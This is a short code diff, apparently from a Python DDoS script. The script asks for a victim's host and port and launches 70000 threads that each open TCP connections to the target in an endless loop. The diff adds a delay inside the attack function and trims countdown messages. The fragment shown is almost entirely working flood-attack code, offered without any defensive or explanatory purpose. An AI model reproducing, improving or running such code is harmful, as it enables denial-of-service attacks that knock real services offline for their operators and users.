@@ -10,6 +10,7 @@ port = int(input("Enter the port number of the victim: "))
 print("\n============================================================\n")
 def attack():
     print(f"starting DDOS Attack... {victim} on port {port} at {start_Time}\n")
+    sleep(3)
     while True:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((victim, port))
@@ -26,9 +27,6 @@ print("Attack startes in 10 sec \n")
 sleep(5)# This is the time in seconds for the attack to run7
 print("Attack startes in 5 sec \n")
 sleep(2)
-print("Attack startes in 3 sec \n")
-sleep(3)
-print("Attack startes in 1 sec \n")
 
 for i in range(70000):
     thread = threading.Thread(target=attack)
